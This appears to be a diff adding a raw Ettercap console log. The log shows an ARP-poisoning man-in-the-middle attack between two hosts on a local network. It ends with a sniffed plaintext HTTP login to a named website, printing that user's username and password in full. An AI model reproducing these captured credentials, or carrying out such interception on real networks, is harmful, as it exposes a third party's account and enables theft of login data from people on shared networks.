@@ -1,0 +1,31 @@
+Listening on:
+ wlan0 -> 74:29:AF:05:97:01
+	  172.20.10.2/255.255.255.240
+	  fe80::ff13:3b28:a91d:d06/64
+	  2a00:1fa0:44d1:6a5c:d89:8180:2eda:1747/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  33 plugins
+  42 protocol dissectors
+  57 ports monitored
+20388 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+Starting Unified sniffing...
+
+Randomizing 15 hosts for scanning...
+Scanning the whole netmask for 15 hosts...
+2 hosts added to the hosts list...
+Host 172.20.10.1 added to TARGET1
+Host 172.20.10.4 added to TARGET2
+
+ARP poisoning victims:
+
+ GROUP 1 : 172.20.10.1 F2:79:60:E8:13:64
+
+ GROUP 2 : 172.20.10.4 AC:FD:CE:82:CE:95
+HTTP : 87.236.16.77:80 -> USER: submit  PASS: 10217200  INFO: http://rulinks.org/
+CONTENT: login_name=pro100ckat&login_password=10217200&login=submit
